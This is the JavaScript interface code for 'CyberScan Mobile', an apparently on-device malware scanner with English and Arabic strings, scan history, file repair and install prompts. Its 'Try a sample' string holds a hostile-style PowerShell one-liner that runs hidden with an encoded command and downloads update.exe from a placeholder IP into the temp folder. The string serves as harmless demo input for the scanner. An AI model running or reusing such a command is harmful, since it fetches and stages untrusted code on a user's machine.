/* CyberScan Mobile: the interface. The engine lives in engine-worker.js. */
"use strict";
(function () {
  const $ = (id) => document.getElementById(id);
  const el = (tag, cls, text) => { const n = document.createElement(tag); if (cls) n.className = cls; if (text != null) n.textContent = text; return n; };

  /* ---------------- words ---------------- */
  const T = {
    en: {
      navScan: "Scan", navHistory: "History", navDevice: "Device",
      tFile: "File", tLink: "Link", tText: "Text", pick: "Choose a file", pickHint: (mb) => `Up to ${mb} MB · stays on this phone`,
      sample: "Try a sample", scan: "Check it", found: "What we found", details: "Details", checks: "Checks",
      s0: "Reading", s1: "Measuring", s2: "Comparing", s3: "Finishing",
      engOff: "On-device engine: not loaded", engOffSub: "Loads the first time you check something (≈ 17 MB, once).",
      engLoading: "Loading the on-device engine…", engReady: "On-device engine ready", engReadySub: (s) => `Python ${s} · nothing leaves this phone`,
      engViewer: "Scanning isn't available on this device yet", engViewerSub: "Cloud scanning is coming soon.",
      stages: { runtime: "Starting Python (WebAssembly)…", numpy: "Loading maths library…", engine: "Loading CyberScan's engine…" },
      cloudSoon: "Cloud scanning for older phones: coming soon.",
      noHistory: "Your checks will appear here. They're stored only on this phone.", clearHistory: "Clear history", cleared: "History cleared",
      verdicts: { NO_INDICATORS_OBSERVED: "CLEAR", REVIEW: "REVIEW", SUSPICIOUS: "SUSPICIOUS" },
      share: "Share", copy: "Copy report", copied: "Copied", repair: "Repair a copy", again: "Check something else",
      repairTitle: "Repair a copy", repairLede: "Removes parts that don't belong in the file's format from a copy. Your original stays as it is.",
      repairRun: "Repair", cancel: "Cancel", repairNone: "Nothing in this file needs removing.", repairDone: "Repaired copy ready",
      repairSave: "Save the copy", repairShare: "Share the copy", repairFail: "Nothing was written",
      deviceTitle: "This device", installTitle: "Install", aboutTitle: "About",
      aboutText: "CyberScan reads files without running them, explains what it finds in plain words, and can remove harmful parts from a copy. On this phone, the analysis runs inside the browser; your files are not uploaded.",
      loadEngine: "Load the engine now", engineLoaded: "Engine loaded",
      tiers: {
        full: ["FULL", "This phone can run the complete engine on the device, including files up to 40 MB."],
        light: ["LIGHT", "This phone runs the engine on demand with files up to 8 MB, and with fewer animations to save battery."],
        viewer: ["VIEWER", "This browser can't run the engine on the device. You can still read the app; cloud scanning is coming soon."],
      },
      caps: { platform: "Platform", tier: "Mode", memoryGB: "Memory", cores: "Processor cores", network: "Network", freeMB: "Free storage", webgl: "3D graphics", standalone: "Installed", benchmarkMs: "Benchmark", screen: "Screen", wasm: "WebAssembly" },
      yes: "Yes", no: "No", unknown: "Not reported",
      installIos: ["Tap the Share button in Safari.", "Choose “Add to Home Screen”.", "Open CyberScan from your home screen: it runs full-screen, like an app."],
      installAndroid: ["Tap “Install app” below, or Chrome's menu › Install app.", "CyberScan appears in your app drawer.", "Share a file from any app to CyberScan to check it."],
      installOther: ["Open this page on your phone.", "Add it to your home screen from the browser menu."],
      installBtn: "Install app", installed: "Installed — open it from your home screen",
      tooBig: (mb) => `This file is larger than ${mb} MB, the limit for this device.`,
      failed: "The check couldn't finish: ", shared: "Received from another app",
      sampleText: "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA; Invoke-WebRequest http://198.51.100.7/update.exe -OutFile $env:TEMP\\update.exe",
    },
    ar: {
      navScan: "فحص", navHistory: "السجل", navDevice: "الجهاز",
      tFile: "ملف", tLink: "رابط", tText: "نص", pick: "اختر ملفًا", pickHint: (mb) => `حتى ${mb} ميغابايت · يبقى على هذا الهاتف`,
      sample: "جرّب مثالًا", scan: "افحصه", found: "ما وجدناه", details: "التفاصيل", checks: "الفحوصات",
      s0: "القراءة", s1: "القياس", s2: "المقارنة", s3: "الإنهاء",
      engOff: "المحرك على الجهاز: غير محمّل", engOffSub: "يُحمّل عند أول فحص (≈ 17 ميغابايت، مرة واحدة).",
      engLoading: "جارٍ تحميل المحرك على الجهاز…", engReady: "المحرك على الجهاز جاهز", engReadySub: (s) => `Python ${s} · لا شيء يغادر هذا الهاتف`,
      engViewer: "الفحص غير متاح على هذا الجهاز بعد", engViewerSub: "الفحص السحابي قادم قريبًا.",
      stages: { runtime: "تشغيل Python (WebAssembly)…", numpy: "تحميل مكتبة الحساب…", engine: "تحميل محرك CyberScan…" },
      cloudSoon: "الفحص السحابي للهواتف القديمة: قريبًا.",
      noHistory: "ستظهر فحوصاتك هنا. تُحفظ على هذا الهاتف فقط.", clearHistory: "مسح السجل", cleared: "تم مسح السجل",
      verdicts: { NO_INDICATORS_OBSERVED: "سليم", REVIEW: "للمراجعة", SUSPICIOUS: "مشبوه" },
      share: "مشاركة", copy: "نسخ التقرير", copied: "تم النسخ", repair: "أصلح نسخة", again: "افحص شيئًا آخر",
      repairTitle: "إصلاح نسخة", repairLede: "يزيل من نسخة الأجزاءَ التي لا تنتمي إلى صيغة الملف. ملفك الأصلي يبقى كما هو.",
      repairRun: "أصلح", cancel: "إلغاء", repairNone: "لا يوجد في هذا الملف ما يحتاج إزالة.", repairDone: "النسخة المُصلحة جاهزة",
      repairSave: "احفظ النسخة", repairShare: "شارك النسخة", repairFail: "لم يُكتب شيء",
      deviceTitle: "هذا الجهاز", installTitle: "التثبيت", aboutTitle: "عن التطبيق",
      aboutText: "يقرأ CyberScan الملفات دون تشغيلها، ويشرح ما يجده بكلمات بسيطة، ويستطيع إزالة الأجزاء الضارة من نسخة. على هذا الهاتف يعمل التحليل داخل المتصفح؛ ملفاتك لا تُرفع.",
      loadEngine: "حمّل المحرك الآن", engineLoaded: "تم تحميل المحرك",
      tiers: {
        full: ["كامل", "يستطيع هذا الهاتف تشغيل المحرك كاملًا على الجهاز، مع ملفات حتى 40 ميغابايت."],
        light: ["خفيف", "يشغّل هذا الهاتف المحرك عند الطلب مع ملفات حتى 8 ميغابايت، وبحركة أقل لتوفير البطارية."],
        viewer: ["عرض فقط", "هذا المتصفح لا يستطيع تشغيل المحرك على الجهاز. يمكنك تصفح التطبيق؛ والفحص السحابي قادم قريبًا."],
      },
      caps: { platform: "النظام", tier: "الوضع", memoryGB: "الذاكرة", cores: "أنوية المعالج", network: "الشبكة", freeMB: "المساحة المتاحة", webgl: "رسوم ثلاثية الأبعاد", standalone: "مثبّت", benchmarkMs: "اختبار السرعة", screen: "الشاشة", wasm: "WebAssembly" },
      yes: "نعم", no: "لا", unknown: "غير معروف",
      installIos: ["اضغط زر المشاركة في Safari.", "اختر «إضافة إلى الشاشة الرئيسية».", "افتح CyberScan من الشاشة الرئيسية: يعمل بملء الشاشة كتطبيق."],
      installAndroid: ["اضغط «ثبّت التطبيق» بالأسفل، أو قائمة Chrome ‹ تثبيت التطبيق.", "يظهر CyberScan بين تطبيقاتك.", "شارك ملفًا من أي تطبيق إلى CyberScan لفحصه."],
      installOther: ["افتح هذه الصفحة على هاتفك.", "أضفها إلى الشاشة الرئيسية من قائمة المتصفح."],
      installBtn: "ثبّت التطبيق", installed: "تم التثبيت — افتحه من الشاشة الرئيسية",
      tooBig: (mb) => `هذا الملف أكبر من ${mb} ميغابايت، وهو حد هذا الجهاز.`,
      failed: "تعذّر إكمال الفحص: ", shared: "وصل من تطبيق آخر",
      sampleText: "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA; Invoke-WebRequest http://198.51.100.7/update.exe -OutFile $env:TEMP\\update.exe",
    },
  };
  let lang = "en";
  try { lang = localStorage.getItem("cyberscan-lang") === "ar" ? "ar" : "en"; } catch { /* storage off */ }
  const t = (k) => (T[lang][k] !== undefined ? T[lang][k] : T.en[k]);

  /* ---------------- state ---------------- */
  const S = { view: "scan", mode: "file", file: null, caps: null, engine: "off", last: null, worker: null, nextId: 1, pending: new Map(), repair: null };
  const platform = window.CSCaps.ios ? "ios" : window.CSCaps.android ? "android" : "other";
  document.body.classList.add(platform);

  /* ---------------- language ---------------- */
  function applyLang() {
    document.documentElement.lang = lang;
    document.documentElement.dir = lang === "ar" ? "rtl" : "ltr";
    document.querySelectorAll("[data-t]").forEach((n) => { const v = t(n.dataset.t); if (typeof v === "string") n.textContent = v; });
    $("lang-toggle").textContent = lang === "ar" ? "EN" : "ع";
    $("text").placeholder = lang === "ar" ? "الصق سكربتًا أو رسالة أو أمرًا…" : "Paste a script, a message or a command…";
    $("cloud-note").textContent = t("cloudSoon");
    $("cloud-soon").textContent = t("cloudSoon");
    setTitle();
    renderEngine();
    if (S.caps) { renderCaps(); updatePickerHint(); }
    renderInstall();
    if (S.last && !$("result").hidden) renderResult(S.last, false);
    if (S.view === "history") renderHistory();
  }
  function setLang(l) { lang = l; try { localStorage.setItem("cyberscan-lang", l); localStorage.setItem("cs-lang-chosen", "1"); } catch { /* storage off */ } applyLang(); }
  $("lang-toggle").addEventListener("click", () => setLang(lang === "ar" ? "en" : "ar"));
  (function firstRun() {
    let chosen = false;
    try { chosen = localStorage.getItem("cs-lang-chosen") === "1"; } catch { /* storage off */ }
    if (chosen) return;
    const sheet = $("lang-sheet");
    sheet.hidden = false;
    sheet.querySelectorAll(".choice").forEach((b) => b.addEventListener("click", () => { setLang(b.dataset.lang); sheet.hidden = true; }));
  })();

  /* ---------------- feedback ---------------- */
  function toast(msg) {
    const n = $("toast"); n.textContent = msg; n.hidden = false;
    clearTimeout(toast.t); toast.t = setTimeout(() => { n.hidden = true; }, 2600);
  }
  const buzz = (pattern) => { if (S.caps && S.caps.vibrate) try { navigator.vibrate(pattern); } catch { /* ignore */ } };
  if (platform === "android") {
    document.addEventListener("pointerdown", (e) => {
      const b = e.target.closest("button, .picker");
      if (!b) return;
      const r = b.getBoundingClientRect(), s = Math.max(r.width, r.height) * 2;
      const rip = el("span", "ripple");
      Object.assign(rip.style, { width: `${s}px`, height: `${s}px`, left: `${e.clientX - r.left - s / 2}px`, top: `${e.clientY - r.top - s / 2}px` });
      if (getComputedStyle(b).position === "static") b.style.position = "relative";
      b.style.overflow = "hidden"; b.append(rip); rip.addEventListener("animationend", () => rip.remove());
    });
  }

  /* ---------------- navigation ---------------- */
  function setTitle() {
    const titles = { scan: t("navScan"), history: t("navHistory"), device: t("navDevice") };
    $("large-title").textContent = titles[S.view];
    $("bar-title").textContent = S.view === "scan" ? "CyberScan" : titles[S.view];
  }
  function go(view) {
    S.view = view;
    document.querySelectorAll(".tab").forEach((b) => b.classList.toggle("on", b.dataset.view === view));
    ["scan", "history", "device"].forEach((v) => { $(`v-${v}`).hidden = v !== view; });
    setTitle();
    if (view === "history") renderHistory();
    if (view === "device") { renderCaps(); renderInstall(); }
    window.scrollTo({ top: 0 });
  }
  document.querySelectorAll(".tab").forEach((b) => b.addEventListener("click", () => { buzz(8); go(b.dataset.view); }));
  window.addEventListener("scroll", () => document.body.classList.toggle("scrolled", scrollY > 40), { passive: true });

  /* ---------------- engine ---------------- */
  function worker() {
    if (S.worker) return S.worker;
    S.worker = new Worker("engine-worker.js");
    S.worker.onmessage = (e) => {
      const m = e.data, job = S.pending.get(m.id);
      if (!job) return;
      if (m.type === "progress") { job.onProgress && job.onProgress(m); return; }
      S.pending.delete(m.id);
      if (m.type === "done") job.resolve(m); else job.reject(new Error(m.error));
    };
    S.worker.onerror = (e) => { S.pending.forEach((j) => j.reject(new Error(e.message || "worker error"))); S.pending.clear(); };
    return S.worker;
  }
  function call(msg, onProgress, transfer) {
    const id = S.nextId++;
    return new Promise((resolve, reject) => {
      S.pending.set(id, { resolve, reject, onProgress });
      worker().postMessage({ ...msg, id }, transfer || []);
    });
  }

  let engineInfo = null, engineStage = "", enginePromise = null;
  function renderEngine() {
    const dot = $("engine-dot"), title = $("engine-title"), sub = $("engine-sub"), bar = $("engine-bar");
    dot.className = "dot";
    if (S.caps && S.caps.tier === "viewer") { dot.classList.add("off"); title.textContent = t("engViewer"); sub.textContent = t("engViewerSub"); bar.style.width = "0"; return; }
    if (S.engine === "ready") { dot.classList.add("ready"); title.textContent = t("engReady"); sub.textContent = t("engReadySub")(engineInfo ? engineInfo.python : "3"); bar.style.width = "0"; return; }
    if (S.engine === "loading") { dot.classList.add("loading"); title.textContent = t("engLoading"); sub.textContent = t("stages")[engineStage] || ""; bar.style.width = { runtime: "25%", numpy: "60%", engine: "85%" }[engineStage] || "10%"; return; }
    title.textContent = t("engOff"); sub.textContent = t("engOffSub"); bar.style.width = "0";
  }
  function loadEngine() {
    if (enginePromise) return enginePromise;
    S.engine = "loading"; engineStage = "runtime"; renderEngine();
    enginePromise = call({ type: "init" }, (p) => { engineStage = p.stage; renderEngine(); })
      .then(async (m) => {
        engineInfo = m.result; S.engine = "ready"; renderEngine();
        // a short real scan tells us how fast this phone actually is
        const b = await call({ type: "scan", kind: "text", value: "benchmark http://example.com/a.exe", display: "benchmark", maxBytes: 1e6 });
        window.CSCaps.adjustAfterBenchmark(S.caps, b.ms);
        document.body.className = document.body.className.replace(/tier-\w+/, `tier-${S.caps.tier}`);
        updatePickerHint();
        return m;
      })
      .catch((err) => { S.engine = "off"; enginePromise = null; renderEngine(); toast(t("failed") + err.message); throw err; });
    return enginePromise;
  }
  $("load-engine").addEventListener("click", () => loadEngine().then(() => toast(t("engineLoaded"))).catch(() => {}));

  /* ---------------- compose ---------------- */
  document.querySelectorAll(".seg-btn").forEach((b) => b.addEventListener("click", () => {
    S.mode = b.dataset.mode;
    document.querySelectorAll(".seg-btn").forEach((x) => x.classList.toggle("on", x === b));
    document.querySelectorAll("[data-panel]").forEach((p) => { p.hidden = p.dataset.panel !== S.mode; });
    ready(); buzz(6);
  }));
  const limitBytes = () => window.CSCaps.LIMITS[(S.caps && S.caps.tier) || "light"];
  function updatePickerHint() { $("picker-hint").textContent = S.caps && S.caps.tier !== "viewer" ? t("pickHint")(Math.round(limitBytes() / 1048576)) : t("cloudSoon"); }
  function chooseFile(file, note) {
    if (!file) return;
    S.file = file;
    $("picker").classList.add("chosen");
    $("picker-label").textContent = `${file.name} · ${fmtBytes(file.size)}`;
    if (note) toast(note);
    ready();
    if (S.caps.tier !== "viewer") loadEngine().catch(() => {}); // warm up while the person decides
  }
  $("file").addEventListener("change", (e) => chooseFile(e.target.files[0]));
  $("url").addEventListener("input", ready);
  $("text").addEventListener("input", ready);
  $("sample").addEventListener("click", () => { $("text").value = t("sampleText"); ready(); });
  function ready() {
    const ok = S.caps && S.caps.tier !== "viewer" && (S.mode === "file" ? !!S.file : S.mode === "url" ? $("url").value.trim().length > 4 : $("text").value.trim().length > 0);
    $("go").disabled = !ok;
  }
  const fmtBytes = (n) => (n < 1024 ? `${n} B` : n < 1048576 ? `${(n / 1024).toFixed(0)} KB` : `${(n / 1048576).toFixed(1)} MB`);

  /* ---------------- scanning ---------------- */
  $("go").addEventListener("click", scan);
  async function scan() {
    if (S.mode === "file" && S.file.size > limitBytes()) { toast(t("tooBig")(Math.round(limitBytes() / 1048576))); return; }
    buzz(12);
    $("compose").hidden = true; $("result").hidden = true; $("progress").hidden = false;
    setSteps([]); $("p-detail").textContent = ""; $("p-pct").textContent = "0%";
    let pct = 0;
    const tick = setInterval(() => { pct = Math.min(pct + 1, 95); $("p-pct").textContent = `${pct}%`; }, 120);
    try {
      await loadEngine();
      const steps = [];
      const onProgress = (p) => {
        if (p.stage !== "scan") { $("p-detail").textContent = t("stages")[p.stage] || ""; return; }
        steps[p.index] = p.state; setSteps(steps); $("p-detail").textContent = p.detail;
        pct = Math.max(pct, (steps.filter((s) => s === "complete").length / 4) * 100 - 5);
      };
      let msg;
      if (S.mode === "file") {
        const buffer = await S.file.arrayBuffer();
        msg = { type: "scan", kind: "file", name: S.file.name, display: S.file.name, buffer, maxBytes: limitBytes() };
        S.lastFile = { name: S.file.name, buffer: buffer.slice(0) };
        const res = await call(msg, onProgress, [buffer]);
        finish(res.result);
      } else {
        const value = $(S.mode).value.trim();
        S.lastFile = null;
        const res = await call({ type: "scan", kind: S.mode, value, display: S.mode === "url" ? value : (lang === "ar" ? "نص ملصوق" : "Pasted text"), maxBytes: limitBytes() }, onProgress);
        finish(res.result);
      }
    } catch (err) {
      $("progress").hidden = true; $("compose").hidden = false; toast(t("failed") + err.message);
    } finally { clearInterval(tick); }
  }
  function setSteps(steps) {
    [...$("steps").children].forEach((li, i) => { li.className = steps[i] || ""; });
  }
  function finish(r) {
    $("p-pct").textContent = "100%";
    r.when = new Date().toISOString();
    S.last = r;
    saveHistory(r);
    setTimeout(() => { $("progress").hidden = true; renderResult(r, true); }, 350);
    buzz(r.classification === "SUSPICIOUS" ? [40, 60, 40, 60, 80] : r.classification === "REVIEW" ? [30, 50, 30] : [15]);
  }

  /* ---------------- result ---------------- */
  const TONE = { ok: "--ok", warn: "--warn", danger: "--bad", neutral: "--muted", info: "--cyan" };
  const SEV = { high: "--bad", critical: "--bad", medium: "--warn", low: "--cyan", info: "--muted" };
  function renderResult(r, animate) {
    $("compose").hidden = true; $("result").hidden = false;
    const p = (r.plain && (r.plain[lang] || r.plain.en)) || null;
    const s = p && p.summary;
    document.documentElement.style.setProperty("--risk", `var(${s ? TONE[s.tone] || "--cyan" : "--cyan"})`);
    $("badge").textContent = `${s ? s.symbol + " " : ""}${t("verdicts")[r.classification] || r.classification}`;
    $("headline").textContent = s ? s.headline : r.classification;
    $("sentence").textContent = s ? s.sentence : r.summary;
    $("advice").textContent = s ? [s.advice, s.limit].filter(Boolean).join(" ") : "";
    $("notice").hidden = !(s && s.notice); if (s && s.notice) $("notice").textContent = s.notice;
    $("chips").replaceChildren(...((s && s.facts) || []).map((f) => el("span", "", f)), el("span", "", lang === "ar" ? "على الجهاز" : "On this phone"));
    $("target").textContent = r.target;
    const meter = $("meter"), C = 326.73, off = C * (1 - r.combined_score / 100);
    if (animate) { meter.style.strokeDashoffset = C; requestAnimationFrame(() => requestAnimationFrame(() => { meter.style.strokeDashoffset = off; })); countUp($("score"), r.combined_score); }
    else { meter.style.strokeDashoffset = off; $("score").textContent = r.combined_score; }

    const findings = p ? p.details.findings : [];
    $("findings").replaceChildren(...(findings.length ? findings.map((f) => {
      const li = el("li"); li.style.setProperty("--sev", `var(${SEV[f.severity] || "--muted"})`);
      li.append(el("b", "", f.title + (f.count > 1 ? ` ×${f.count}` : "")));
      if (f.body && f.body !== f.title) li.append(el("span", "", f.body));
      return li;
    }) : [Object.assign(el("li"), { textContent: lang === "ar" ? "لا توجد علامات تحذير." : "No warning signs." })]));
    $("facts").replaceChildren(...((p && p.details.facts) || []).map(([k, v]) => { const d = el("div"); d.append(el("dt", "", k), el("dd", "", v)); return d; }));
    $("checks").replaceChildren(...((p && p.details.checks) || []).map((c) => { const li = el("li"); li.append(el("b", "", `${c.symbol} ${c.name}`), el("small", "", c.reason || c.state)); return li; }));
    $("mitre-box").hidden = !(r.mitre || []).length;
    $("mitre").replaceChildren(...(r.mitre || []).map((m) => el("li", "", `${m.id} · ${m.name || ""}`)));
    $("limits").textContent = r.limitations || "";

    const acts = $("actions"); acts.replaceChildren();
    const add = (label, fn, cls) => { const b = el("button", cls || "", label); b.type = "button"; b.addEventListener("click", fn); acts.append(b); };
    add(t("again"), newScan, "primary-act");
    if (S.caps.share) add(t("share"), () => navigator.share({ title: "CyberScan", text: `${$("headline").textContent}\n${r.target}\n${r.combined_score}/100` }).catch(() => {}));
    add(t("copy"), () => navigator.clipboard.writeText(r.report_text).then(() => toast(t("copied"))).catch(() => {}));
    if (S.lastFile && r.target === S.lastFile.name) add(t("repair"), openRepair);
    if (animate) window.scrollTo({ top: 0, behavior: "smooth" });
  }
  function countUp(node, target) {
    const start = performance.now();
    const step = (now) => { const k = Math.min(1, (now - start) / 1300); node.textContent = Math.round(target * (1 - Math.pow(1 - k, 3))); if (k < 1) requestAnimationFrame(step); };
    requestAnimationFrame(step);
  }
  function newScan() {
    $("result").hidden = true; $("compose").hidden = false;
    S.file = null; $("file").value = ""; $("picker").classList.remove("chosen"); $("picker-label").textContent = t("pick");
    ready();
  }

  /* ---------------- repair ---------------- */
  async function openRepair() {
    const sheet = $("repair-sheet"); sheet.hidden = false;
    $("repair-out").hidden = true; $("repair-run").hidden = false; $("repair-list").replaceChildren(el("li", "", "…"));
    try {
      const res = await call({ type: "repair-open", name: S.lastFile.name, buffer: S.lastFile.buffer.slice(0) });
      S.repair = res.result;
      const items = S.repair.findings;
      if (!items.length) { $("repair-list").replaceChildren(el("li", "", t("repairNone"))); $("repair-run").hidden = true; return; }
      $("repair-list").replaceChildren(...items.map((f) => {
        const li = el("li", "repair-item"); li.style.setProperty("--sev", `var(${SEV[f.severity] || "--muted"})`);
        const box = el("input"); box.type = "checkbox"; box.value = f.key; box.disabled = !f.repairable; box.checked = f.repairable && f.recommended;
        const text = el("div"); text.append(el("b", "", f.title[lang] || f.title.en), el("span", "", f.body[lang] || f.body.en));
        li.append(box, text); return li;
      }));
    } catch (err) { $("repair-list").replaceChildren(el("li", "", t("failed") + err.message)); }
  }
  $("repair-cancel").addEventListener("click", () => { $("repair-sheet").hidden = true; });
  $("repair-run").addEventListener("click", async () => {
    const keys = [...$("repair-list").querySelectorAll("input:checked")].map((b) => b.value);
    if (!keys.length) return;
    const out = $("repair-out"); out.hidden = false; out.replaceChildren(el("p", "muted", "…"));
    try {
      const res = await call({ type: "repair-run", session: S.repair.id, keys });
      const r = res.result;
      if (!r.ok || !res.bytes) { out.replaceChildren(el("b", "", t("repairFail")), el("p", "muted", r.message || "")); return; }
      buzz([20, 40, 20]);
      const file = new File([res.bytes], r.output_name || `repaired-${S.repair.name}`, { type: "application/octet-stream" });
      const save = el("button", "cta small", t("repairSave")); save.type = "button";
      save.addEventListener("click", () => { const a = el("a"); a.href = URL.createObjectURL(file); a.download = file.name; a.click(); setTimeout(() => URL.revokeObjectURL(a.href), 4000); });
      out.replaceChildren(el("b", "", `✓ ${t("repairDone")}`), el("p", "muted", `${fmtBytes(r.removed_bytes)} · ${r.before} → ${r.after}`), save);
      if (navigator.canShare && navigator.canShare({ files: [file] })) {
        const share = el("button", "ghost", t("repairShare")); share.type = "button";
        share.addEventListener("click", () => navigator.share({ files: [file], title: file.name }).catch(() => {}));
        out.append(share);
      }
      $("repair-run").hidden = true;
    } catch (err) { out.replaceChildren(el("p", "muted", t("failed") + err.message)); }
  });

  /* ---------------- history (on this phone only) ---------------- */
  const HKEY = "csm-history";
  function loadHistory() { try { return JSON.parse(localStorage.getItem(HKEY) || "[]"); } catch { return []; } }
  function saveHistory(r) {
    const slim = { ...r, structure: null, entropy: { ...r.entropy, trajectory: [] }, report_text: r.report_text };
    const list = [slim, ...loadHistory()].slice(0, 40);
    try { localStorage.setItem(HKEY, JSON.stringify(list)); } catch { try { localStorage.setItem(HKEY, JSON.stringify(list.slice(0, 10))); } catch { /* full */ } }
  }
  function renderHistory() {
    const list = loadHistory();
    $("history-empty").hidden = list.length > 0;
    $("clear-history").hidden = !list.length;
    const RISK = { NO_INDICATORS_OBSERVED: "--ok", REVIEW: "--warn", SUSPICIOUS: "--bad" };
    $("history").replaceChildren(...list.map((r) => {
      const li = el("li"); li.style.setProperty("--sev", `var(${RISK[r.classification] || "--muted"})`);
      const p = r.plain && (r.plain[lang] || r.plain.en);
      li.append(el("b", "", `${r.combined_score} · ${r.target}`), el("span", "", `${p ? p.summary.headline : r.classification} · ${new Date(r.when).toLocaleString(lang)}`));
      li.addEventListener("click", () => { S.last = r; S.lastFile = null; go("scan"); renderResult(r, true); });
      return li;
    }));
  }
  $("clear-history").addEventListener("click", () => { try { localStorage.removeItem(HKEY); } catch { /* storage off */ } renderHistory(); toast(t("cleared")); });

  /* ---------------- device ---------------- */
  function renderCaps() {
    const c = S.caps; if (!c) return;
    const [name, text] = t("tiers")[c.tier];
    $("tier-name").textContent = name; $("tier-name").className = `tier ${c.tier}`; $("tier-text").textContent = text;
    $("load-engine").hidden = c.tier === "viewer" || S.engine === "ready";
    const L = t("caps"), yn = (v) => (v ? t("yes") : t("no"));
    const rows = [
      ["platform", { ios: "iPhone / iPad", android: "Android", other: lang === "ar" ? "أخرى" : "Other" }[c.platform]],
      ["tier", name], ["wasm", yn(c.wasm)],
      ["memoryGB", c.memoryGB ? `${c.memoryGB} GB` : t("unknown")], ["cores", c.cores || t("unknown")],
      ["network", c.network ? `${c.network}${c.saveData ? " · data saver" : ""}` : t("unknown")],
      ["freeMB", c.freeMB != null ? fmtBytes(c.freeMB * 1048576) : t("unknown")], ["webgl", yn(c.webgl)],
      ["standalone", yn(c.standalone)], ["screen", c.screen],
      ["benchmarkMs", c.benchmarkMs != null ? `${Math.round(c.benchmarkMs)} ms` : "—"],
    ];
    $("caps").replaceChildren(...rows.map(([k, v]) => { const d = el("div"); d.append(el("dt", "", L[k]), el("dd", "", String(v))); return d; }));
  }
  let installEvent = null;
  window.addEventListener("beforeinstallprompt", (e) => { e.preventDefault(); installEvent = e; renderInstall(); });
  function renderInstall() {
    const box = $("install-card"); if (!box) return;
    if (S.caps && S.caps.standalone) { box.replaceChildren(el("p", "muted", `✓ ${t("installed")}`)); return; }
    const steps = platform === "ios" ? t("installIos") : platform === "android" ? t("installAndroid") : t("installOther");
    const ol = el("ol"); steps.forEach((s) => ol.append(el("li", "", s)));
    box.replaceChildren(ol);
    if (installEvent) {
      const b = el("button", "cta small", t("installBtn")); b.type = "button";
      b.addEventListener("click", async () => { installEvent.prompt(); await installEvent.userChoice.catch(() => {}); installEvent = null; renderInstall(); });
      box.append(b);
    }
  }

  /* ---------------- shared from another app (Android share target) ---------------- */
  async function receiveShared() {
    if (!new URLSearchParams(location.search).has("shared") || !("caches" in window)) return;
    const cache = await caches.open("cs-share");
    const file = await cache.match("/m/__shared_file");
    const text = await cache.match("/m/__shared_text");
    if (file) {
      const name = decodeURIComponent(file.headers.get("X-Name") || "shared-file");
      chooseFile(new File([await file.blob()], name), t("shared"));
    } else if (text) {
      const value = (await text.text()).trim();
      const mode = /^https?:\/\/\S+$/i.test(value) ? "url" : "text";
      document.querySelector(`.seg-btn[data-mode="${mode}"]`).click();
      $(mode).value = value; ready(); toast(t("shared"));
    }
    await cache.delete("/m/__shared_file"); await cache.delete("/m/__shared_text");
    history.replaceState(null, "", location.pathname);
  }

  /* ---------------- start ---------------- */
  (async () => {
    S.caps = await window.CSCaps.measure();
    document.body.classList.add(`tier-${S.caps.tier}`);
    applyLang();
    updatePickerHint();
    ready();
    if ("serviceWorker" in navigator && window.isSecureContext) navigator.serviceWorker.register("../sw.js").catch(() => {});
    receiveShared().catch(() => {});
    window.CSM = { S, loadEngine, call, scan };
  })();
})();
